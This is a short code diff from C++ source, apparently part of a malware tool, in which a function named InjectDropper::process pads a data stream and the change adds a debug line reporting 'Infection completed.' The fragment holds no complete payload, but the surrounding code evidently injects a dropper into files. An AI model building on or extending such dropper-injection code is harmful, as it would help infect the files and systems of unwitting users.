@@ -44,6 +44,7 @@ StateResult InjectDropper::process()
 	std::vector<char> padding(missingBytesToPredictedSize, 0);
 	context<StreamingMelter>().complete( &padding[0], missingBytesToPredictedSize);
 	DBGTRACE_HEX("Injecting padding size: ", (DWORD) missingBytesToPredictedSize, NOTIFY);
+	DBGTRACE("Infection completed.", "", NOTIFY);
 
 	offsetToNext() = currentOffset() + neededBytes();
 
